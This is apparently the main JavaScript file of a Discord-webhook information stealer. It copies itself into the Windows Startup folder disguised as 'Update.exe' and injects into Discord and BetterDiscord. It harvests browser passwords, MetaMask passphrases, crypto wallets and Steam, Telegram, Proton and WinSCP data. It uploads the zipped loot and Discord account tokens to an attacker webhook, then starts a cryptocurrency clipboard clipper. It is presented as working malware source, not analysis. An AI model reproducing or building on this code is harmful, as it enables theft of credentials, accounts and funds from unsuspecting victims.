const admin = require("./utils/admin")
const browsers = require("./utils/browsers");
const clipper = require("./utils/clipper");
const core = require("./utils/core");
const crypto = require("./utils/crypto");
const discord = require("./utils/discord");
const files = require("./utils/files");
const { upload }= require("./utils/gofile");
const infos = require("./utils/infos");
const injection = require("./utils/injection");
const save = require("./utils/save");
const { stat } = require("./utils/stats");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
//const { exec } = require("child_process");
    
async function start() {

    //RIP All KVM Systems
    //try {
    //  const bozo = await core.isVm();
    //  if (bozo) {
    //      console.log("Failed to setup ! Please try again after downloading the dependencies.")
    //      return
    //  }
    //} catch (e) { }
    //Imagine he really thinks he's done away with it, lmao.
    try {
        fs.copyFileSync(process.cwd() + "\\" + process.argv0.split("\\")[process.argv0.split("\\").length-1], process.env.APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.exe");
    } catch (e) { }
        
        //Just our API.. Not dual b*tch !
        const webhook = "%WEBHOOK%"
        save.Init();
    
        const ip = await core.getPublicIp();
        const hostname = await core.getHostname();
        const username = process.env.userprofile.split("\\")[2]
    
        //Finally it starts! At last, I think?
        console.log("Starting...")
        
        //Disable one module with the "//", practical, isn't it?
        injection.inject(webhook);
        injection.pwnBetterDiscord();
        admin.grabWinSCP();
        crypto.grabColds();
        crypto.grabExtensions();
        crypto.exodusDecrypt();
        files.grabBattle();
        files.grabProton();
        infos.getSysteminformations();
        files.grabSimple();
        files.grabSteam();
        files.grabTelegram();
        files.grabTox();
        //files.fileGrabber();
        
        //Metamask are safe only if you don't keep you password... LOL ?
        try {
            const passwords = await browsers.grabBrowsers();
            const passphrase = await crypto.grabMetamask(passwords);
            stat.AddPassphrase(passphrase);
        } catch (e) { }

        const zipPath = await save.zipResult();
    
        var formData = new FormData();
        if ((fs.statSync(zipPath).size/1000/1000) > 7) {
            link = await upload(zipPath);
            
            formData.append('payload_json', stat.Build(username, hostname, ip, link))
        } else {
            formData.append('payload_json', stat.Build(username, hostname, ip, ""))
            formData.append('file', fs.createReadStream(zipPath))
        }
        
        //Send your cyber-information in one zip file
        try {
            axios.all([
                await axios({
                    url: webhook,
                    method: 'POST',
                    headers: {
                        ...formData.getHeaders()
                    },
                    data: formData,
                }),
            ])
        } catch (e) { }

        //Don't touch or gay, OK ?
        //fs.rmSync(save.basepath + "\\", { recursive: true, force: true });

        //Discord sells all our data to Tencent... What if interpole is looking for us?
        const accounts = await discord.grabDiscord();

        var embeds = [];
        for (let i = 0; i < accounts.length; i++) {
            const acc = accounts[i];
            embeds.push(discord.embed(acc.username, acc.tag, acc.id, acc.nitro, acc.badges, acc.bio, acc.billings, acc.email, acc.phone, acc.token, acc.avatar));
        }
    
        if (embeds.length != 0) {
            try {
                await axios({
                    url: webhook,
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    data: discord.compile(embeds.slice(0, 10))
                })
            } catch (e) { }
        }

        //Ghost zip, lol.
        //fs.unlinkSync(zipPath);

        clipper.walletClipper();
    }
start();